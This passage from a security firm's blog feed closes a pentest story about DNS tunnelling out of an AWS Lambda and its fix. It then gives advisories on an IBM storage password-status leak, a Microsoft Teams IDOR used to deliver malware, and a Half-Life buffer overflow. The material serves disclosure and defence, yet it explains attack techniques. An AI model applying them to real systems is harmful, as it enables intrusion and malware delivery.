    &lt;img src=&#34;images/pic16.png&#34; title=&#34;pic16&#34; alt=&#34;pic16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Running &lt;code&gt;sts get-caller-identity&lt;/code&gt;, the &lt;code&gt;whoami&lt;/code&gt; for aws cli, we can see that the authentication as the lambda was successful.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic17.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then comes the somewhat anticlimatic end to the engagement. With bruteforcing cloud resources that the Lambda&amp;rsquo;s identity could access, I found that everything returned empty except the IP ranges used, which honestly wasn&amp;rsquo;t much. There were some other attack vectors pertaining the Lambda angle, such as the &lt;code&gt;/invocation/next&lt;/code&gt; endpoint and so on, but avenues to further lateral movement and escalation within the AWS tenant appeared to be limited.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic18.png&#34; title=&#34;pic18&#34; alt=&#34;pic18&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic18&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Epilogue - Investigations on AWS&lt;span class=&#34;absolute -mt-20&#34; id=&#34;epilogue---investigations-on-aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#epilogue---investigations-on-aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Throughout the testing of this application I was in constant back-and-forth communications with the client to keep them up to date with my findings, and potential ways to remediate the vulnerabilities discovered. All in all, they were quite glad that we have discovered issues of this magnitude, and were shocked that the application could talk to the outside world via DNS when they supposedly &amp;ldquo;blocked everything&amp;rdquo;. In the report I suggested to look into built-in cloud DNS capabilities and blocking ports alone might not be enough to stop an &amp;ldquo;air gapped&amp;rdquo; cloud app from DNS tunnelling, especially the server-less kinds. (Think Lambda for AWS, or PowerApp for Azure).&lt;/p&gt;
&lt;p&gt;After delivering the report I couldn&amp;rsquo;t stop thinking about this remediation bit because:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;I thought it should be possible to configure that capacity, but I&amp;rsquo;m not 100% sure how to. So if I deployed a Lambda myself, I wasn&amp;rsquo;t sure yet how it should be secured against this attack (besides not having an RCE, phew!).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Or … what if there wasn&amp;rsquo;t an AWS native thing you could just enable and call it a day? Could I have just found a CVE on AWS Lambda itself?&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So the lingering thought drove me to spin up my own Lambda which executed plain old Python 3.11. I set up the Network Security Group to block 0.0.0.0/0 on all the TCP and UDP ports, and gave it a go. Voila, the same issue, DNS tunnelling through and querying my Burp Collaborator. Okay, first step done. How to close it off?&lt;/p&gt;
&lt;p&gt;I searched around for a bit for strings like &amp;ldquo;DNS Firewall&amp;rdquo; within AWS and on Google. Soon I found this: &amp;ldquo;Route 53 Resolver DNS Firewall&amp;rdquo;, a billable service … that blocks port 53 after you have blocked port 53. I was like &amp;ldquo;of course Jeff, I knew you&amp;rsquo;d do this to us…&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic19.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To keep the setup description short, what you need to do is to create a rule group first. In configurations, as I needed a blanket block I defined a rule to block absolutely everything, then click add rule. If you need some DNS resolution for your internal domains, you could define a custom allowlist.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic20.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After the rules are sorted, associate the rule group with a VPC that contains your application or VM, and it&amp;rsquo;s all done! The Lambda was no longer querying random DNS servers for arbitrary domains.&lt;/p&gt;
&lt;p&gt;I hope you&amp;rsquo;ve enjoyed this rather convoluted story about how an app test turned into me trying to implement a custom DNS tunnelling protocol not dissimilar to what you&amp;rsquo;d see on C2 frameworks, just minus the encryption, stealth and redundancy bits. And then we investigated some obscure functionality invented by AWS to add to your cloud bill and block the same thing twice.&lt;/p&gt;
&lt;p&gt;The client definitely found it a very cool story during our debrief and allowed me to publish it, so although we&amp;rsquo;re not gonna name names, thank you unnamed client! And thank you, the reader for making it to the end.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-43042 – IBM Backup Products Superuser Information Disclosure&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</link>
      <pubDate>Thu, 21 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; 8.3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.ibm.com/support/pages/node/7064976&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.ibm.com/support/pages/node/7064976&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-43042&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 08/12/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.0 Score:&lt;/strong&gt; 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Max Corbridge&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC’s Head of Adversarial Simulation (&lt;a href=&#34;https://twitter.com/CorbridgeMax&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@CorbridgeMax&lt;/a&gt;) discovered that an unauthenticated user can determine whether the default superuser password has been changed on IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products. These products were found to be a single point of failure for backup and disaster recovery processes within client environments, and as such are highly critical systems. &lt;/p&gt;
&lt;p&gt;This only affects the 8.3.1 release as it is impossible for the default password to still be configured on an active system running later releases, since the user must change this either as part of first time setup or prior to upgrading from 8.3.1 or earlier. However, IBM has removed the ability to query this status from all releases listed in the Mitigation section of this advisory.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IBM web servers related to backup/storage products respond to unauthenticated GET requests to the &lt;em&gt;/login&lt;/em&gt; page with the name of the superuser account and if the default password has been changed or not. This could allow unauthenticated attackers on the network with the necessary information to compromise what is often a business-critical asset, with superuser permissions. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 
Cache-Control: no-cache, no-store, must-revalidate
Strict-Transport-Security: max-age=778000; includeSubDomains
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer-when-downgrade
Pragma: no-cache
X-Content-Type-Options: nosniff
SET-COOKIE: JSESSIONID=[REDACTED];Path=/;Secure;SameSite=Lax
SET-COOKIE: _sync=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _redirect=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _sync=[REDACTED]; HttpOnly; Secure
X-FRAME-OPTIONS: DENY
Cache-Control: post-check=0, pre-check=0
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Fri, 08 Sep 2023 12:28:27 GMT
Connection: close
Content-Length: 70858



&amp;lt;!DOCTYPE html&amp;gt;

&amp;lt;html&amp;gt;
[SNIPPED_FOR_BREVITY]
&amp;#34;superuserPasswordChanged&amp;#34;:true,&amp;#34;hasEnvironmentals&amp;#34;:true,
[SNIPPED_FOR_BREVITY]
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Figure 1: HTTP Response from IBM FlashSystem Webserver&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As a priority, change the superuser password if it is still set to the default.&lt;/p&gt;
&lt;p&gt;IBM also recommends that you fix this vulnerability by upgrading affected versions of IBM SAN Volume Controller, IBM Storwize V7000, IBM Storwize V5000 and V5100, IBM Storwize V5000E, IBM Spectrum Virtualize Software, IBM Spectrum Virtualize for Public Cloud, IBM FlashSystem V9000, IBM FlashSystem 9500, IBM FlashSystem 9100 Family, IBM FlashSystem 9200, IBM FlashSystem 7300, IBM FlashSystem 7200, IBM FlashSystem 5200 and IBM FlashSystem 5000 to the following code levels or higher:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.2.0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.0.2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.5.0.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.4.0.12&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.3.1.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Please note that it is necessary to change the superuser password before upgrading from 8.3.1 to 8.4.0 or later, which is the reason why this upgrade remediates the vulnerability.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;08/09/2023: Vulnerability submitted through IBM’s Vulnerability Disclosure Program&lt;/p&gt;
&lt;p&gt;13/12/2023: Vulnerability remediated and public notice created by IBM.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory: IDOR in Microsoft Teams Allows for External Tenants to Introduce Malware</title>
      <link>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</link>
      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</guid>
      <description>
        
        
        &lt;h3&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tldr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Max Corbridge (@CorbridgeMax) and Tom Ellson (@tde_sec) of JUMPSEC’s Red Team recently discovered a vulnerability in the latest version of Microsoft Teams which allows for the possible introduction of malware into any organisations using Microsoft Teams in its default configuration. This is done by bypassing client-side security controls which prevent external tenants from sending files (malware in this case) to staff in your organisation. JUMPSEC has detailed remediation options, as well as some detection opportunities. &lt;/p&gt;
&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Introducing malware into target organisations is becoming increasingly difficult. Many of the traditional payload types (.exe, Office Macros, etc) are now heavily-scrutinised or have been proactively addressed to reduce their &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;efficacy&lt;/em&gt;&lt;/a&gt;. Similarly, payload delivery avenues such as phishing are becoming increasingly monitored and secured to reduce the ease with which threat actors’ malware can reach end-user devices. Mail security controls, IP blocklists, domain reputation, email HTML, content inspection, third-party mail security products, URL filtering and many more must be bypassed for a phishing campaign to traverse all anti-phishing security controls and land in a target’s inbox. &lt;/p&gt;
&lt;p&gt;As such, threat actors and red teams alike are looking for newer and potentially overlooked avenues of payload delivery. One such novel avenue is Microsoft Teams External Tenants. Organisations that use Microsoft Teams (91% of the Fortune 100 according to &lt;a href=&#34;https://www.linkedin.com/pulse/91-fortune-100-companies-use-teams-techbanditshack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;this article&lt;/em&gt;&lt;/a&gt;) inherit Microsoft’s default configuration which allows users from outside of their organisation to reach out to their staff members. By allowing this, an entirely new avenue of social engineering (and now payload delivery as this blog will explain) is created.&lt;/p&gt;
&lt;h3&gt;Detail&lt;span class=&#34;absolute -mt-20&#34; id=&#34;detail&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#detail&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft Teams allows any user with a Microsoft account to reach out to ‘external tenancies’. Here, external tenancies can be thought of as any business or organisation using Microsoft Teams. These organisations each have their own Microsoft tenancy, and users from one tenancy are able to send messages to users in another tenancy. When doing so, an ‘External’ banner appears alongside the name as seen below. &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19671&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;391&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/external.png&#34; title=&#34;External banner on incoming message&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;External banner on incoming message&lt;/figcaption&gt;
  &lt;/figure&gt; External banner applied to incoming message requests[/caption]&lt;/p&gt;
&lt;p&gt;As someone who spent a long time doing purely social engineering (phishing, vishing, smshing, etc.) this is not a show stopper by any means. In my experience, whilst this banner (and the subsequent pop-up) may deter a handful of targets, there is still a significant percentage of staff that would click on a message from an external tenant and accept the subsequent warning that the user is ‘external’. In fact, this was proven only last month, as the techniques used in this blog post were successfully used to gain an initial foothold in a client’s environment as part of a red team engagement. This is especially true if the malicious party is impersonating a known member of your organisation, and has purchased and registered a brand-impersonation domain as red teams often do.&lt;/p&gt;
&lt;p&gt;When messaging staff in another organisation you are blocked from sending files to them, unlike with members of your own tenancy. See below the difference:&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19672&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1496&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;Messaging a member of the same organisation&#34; alt=&#34;Messaging a member of the same organisation &#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Messaging a member of the same organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Messaging a member of the same organisation[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19673&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1421&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/2.png&#34; title=&#34;Restrictions when messaging someone in a different organisation&#34; alt=&#34;Restrictions when messaging someone in a different organisation&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Restrictions when messaging someone in a different organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Restrictions when messaging someone in a different organisation[/caption]&lt;/p&gt;
&lt;p&gt;So far, this is nothing new. However, having leveraged this social engineering avenue in the past I began wondering if this security control could be bypassed to allow for seamless delivery of payloads directly into a target&amp;rsquo;s inbox on our red team engagements. I began looking online, and articles &lt;a href=&#34;https://aadinternals.com/post/teams-policies/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;like this&lt;/em&gt;&lt;/a&gt; suggested that certain security controls are actually implemented client-side in Microsoft Teams.&lt;/p&gt;
&lt;p&gt;I raised this with JUMPSEC’s Head of Offensive Security (Tom Ellson) and no more than 10 minutes later we had bypassed the security control and were able to send files into a target organisation. Exploitation of the vulnerability was straightforward using a traditional IDOR technique of switching the internal and external recipient ID on the POST request, usually here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;/v1/users/ME/conversations/&amp;lt;RECIPIENT_ID&amp;gt;/messages &lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19674&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1429&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/3.png&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;3&lt;/figcaption&gt;
  &lt;/figure&gt; Payload delivered directly into a target inbox[/caption]&lt;/p&gt;
&lt;p&gt;When sending the payload like this, it is actually hosted on a Sharepoint domain and the target downloads it from there. It appears, however, in the target inbox as a file, not a link. &lt;/p&gt;
&lt;p&gt;Having identified the issue, I wanted to validate that this vulnerability would work as intended as an avenue for payload delivery into a target organisation, and not fall short for some unknown reason when used in a mature client environment. As such, last month I used this vulnerability to deliver our red team C2 (malware) payload directly into a target inbox to gain our initial foothold on a covert red team engagement. This allowed for a much more simple, reliable, and user-friendly payload delivery avenue than traditional phishing journeys. &lt;/p&gt;
&lt;h3&gt;Why is this a big deal?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-is-this-a-big-deal&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#why-is-this-a-big-deal&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The true reason I see this to be a potentially lucrative avenue for threat actors to deliver payloads is the fact that this bypasses nearly all modern anti-phishing security controls mentioned in the introduction of this advisory. &lt;/p&gt;
&lt;p&gt;Firstly, it is very straightforward to buy a domain similar to your target organisations and register it with M365. It avoids the need to use mature domains, with web servers, landing pages, CAPTCHAs, domain categorisation, and URL filtering. This is a huge time saver, as this can cost several days or more on a red team engagement when setting up the various bits of infrastructure needed for a convincing phishing campaign. &lt;/p&gt;
&lt;p&gt;Secondly, it avoids the now-rightfully-dangerous act of clicking on a link in an email, something that staff have been trained to avoid for years now, greatly reducing the likelihood of a typical staff member detecting this as a phishing attack. The payload will now be served by a trusted Sharepoint domain, and will arrive in the form of a file in a target’s Teams inbox. As such, the payload inherits the trust reputation of Sharepoint, not a malicious phishing website.&lt;/p&gt;
&lt;p&gt;Finally, when this vulnerability is combined with social engineering via Teams it becomes very easy to start a back-and-forth conversation, jump on a call, share screens, and more. By comparison, it makes social engineering via email feel very stagnant, and stop-start. When using this on a real engagement the pretext of an IT technician was used to ask the target if they could jump on a call to update some critical software. Once on the call this vulnerability was leveraged to deliver a payload and, when combined with a full social engineering attack, was implicitly trusted by the target. &lt;/p&gt;
&lt;h3&gt;Impact&lt;span class=&#34;absolute -mt-20&#34; id=&#34;impact&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#impact&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability affects every organisation using Teams in the default configuration. As such it has huge potential reach, and could be leveraged by threat actors to bypass many traditional payload delivery security controls. Having now proven this hypothesis, and used this vulnerability to successfully deliver malware that compromised a target machine in a client&amp;rsquo;s environment, I feel this has been successfully demonstrated as an exploitable finding.&lt;/p&gt;
&lt;h3&gt;Remediation and Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;remediation-and-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#remediation-and-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability was reported to Microsoft, who validated that the vulnerability is legitimate, but said that it ‘did not meet the bar for immediate servicing’. I think this is a shame, but was nonetheless expected. As such, JUMPSEC has added this section to help organisations who might be concerned about the above findings. &lt;/p&gt;
&lt;p&gt;Firstly, I urge you to review if there is a business requirement for external tenants to have permission to message your staff in the first place. Of course, many businesses do legitimately require communication with other organisations, service providers, and more. That is not the case, however, for all businesses that use Teams. If you are not currently using Teams for regular communication with external tenants, tighten up your security controls and remove the option altogether. This can be done in Microsoft Teams Admin Center &amp;gt; External Access.&lt;/p&gt;
&lt;p&gt;If you do require communication with external tenants, but there are only a handful of organisations that you regularly communicate with, then you can change the security settings to only allow communication with certain allow-listed domains. This would be a good middle ground for shutting down this attack path, without affecting your business operations. This can be done in Microsoft Teams Admin Center &amp;gt; External Access. &lt;/p&gt;
&lt;p&gt;If either of the above will not work in your unique business case you have a few options. Firstly, endeavour to educate staff on the possibility of productivity apps such as Teams, Slack, Sharepoint, etc, for launching social engineering campaigns. It is not just email that is being abused any more, and yet it seems, in my personal opinion, that when using alternative avenues to email there is an inherent trust, due to the rich history connecting phishing and emails. &lt;/p&gt;
&lt;p&gt;Regarding detections, there is currently limited support from Microsoft. Whilst there are plenty of Teams logs (see here for a full list &lt;a href=&#34;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&lt;/a&gt;) these do not currently cover the crucial ‘External Tenants Messaging your Staff’, or even better ‘Staff Member Accepts Message Request from External Tenant’. The latter would be preferable, as it would eliminate alerts from previously-known external tenants (your service providers, etc) and focus just on new message requests. I have reached out to Microsoft to attempt to turn on these logs so that they can be monitored in line with the increased usage of Teams for social engineering. If you agree that this should be made available, then please give the feature request a thumbs up (&lt;a href=&#34;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Whilst not a perfect solution, it would be possible to use web proxy logs to alert on, or more likely gain some baseline visibility into, staff members accepting external message requests. In EMEA, when a Teams user accepts a message request from an external tenant it sends a POST request to a unique URI which you can monitor:&lt;/p&gt;
&lt;p&gt;/api/mt/emea/beta/userSettings/acceptlist/manage&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19675&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;947&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/request_clean.png&#34; title=&#34;request clean&#34; alt=&#34;request clean&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;request clean&lt;/figcaption&gt;
  &lt;/figure&gt; URI for accepting external message requests[/caption]&lt;/p&gt;
&lt;p&gt;The difficulty, at present, is turning this into a useful piece of telemetry with usernames, and the message in question. Monitoring this will, however, give you an idea of how common this transaction is in your estate, and allow you to potentially implement some of the mitigation factors mentioned above with a more educated understanding. &lt;/p&gt;
&lt;h3&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As a Red Teamer regularly tasked with achieving an initial foothold in a target organisation, I have a unique appreciation and concern for the above-mentioned finding. With over 270 million active monthly users, Teams is incredibly common in target organisations. JUMPSEC’s Detection and Response Team (DART) have seen a trend towards novel phishing and payload delivery techniques leveraged in the wild, including but not limited to using Teams external tenancies for social engineering. With threat actors continually experimenting with new social engineering attacks, organisations are having to expand their security awareness to cover previously-overlooked frontiers.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-30382 – Half-Life Local Privilege Escalation&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/05/2023-05-23-advisory-cve-2023-30382-half-life-local-privilege-escalation/</link>
      <pubDate>Tue, 23 May 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/05/2023-05-23-advisory-cve-2023-30382-half-life-local-privilege-escalation/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; Half-Life&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; Latest (&amp;lt;= build 5433873), at the time of writing&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.valvesoftware.com&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;www.valvesoftware.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-30382&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 23/05/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.1 Score:&lt;/strong&gt; 8.2 AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Local&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Ryan Saridar&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;An attacker can leverage a stack-based buffer overflow via Half-Life’s command line arguments to compromise the account of any local user who launches the game.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;hl.exe does not adequately perform bounds checking on the command line used to launch it, allowing an attacker with control of the launch parameters to gain code execution as the user running it. By default, all users can access the C:\Program Files (x86)\Steam\userdata\&lt;steamID3&gt;\config\localconfig.vdf file, which can be modified to enforce a Steam application to launch with any provided command line parameters. Combining these, a low-privileged attacker can set specially crafted launch parameters using this file, and therefore gain privilege escalation when a higher privileged user runs the application.&lt;/p&gt;
&lt;p&gt;The cause of the buffer overflow is found in the CCommandLine::CreateCmdLine and CCommandLine::LoadParametersFromFile functions. CreateCmdLine allocates a 4096 byte buffer which LoadParametersFromFile copies the command line to. Given that the command line is not restricted to 4096 bytes, this can lead to an overflow. This appears to have been fixed in games such as HL2 and TF2, however the fix was not applied to the original HL.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Valve has not responded to previous submissions of this issue, meaning the game is not patched. The simplest and most effective method of mitigation at this time is the uninstallation of Half-Life.&lt;/p&gt;
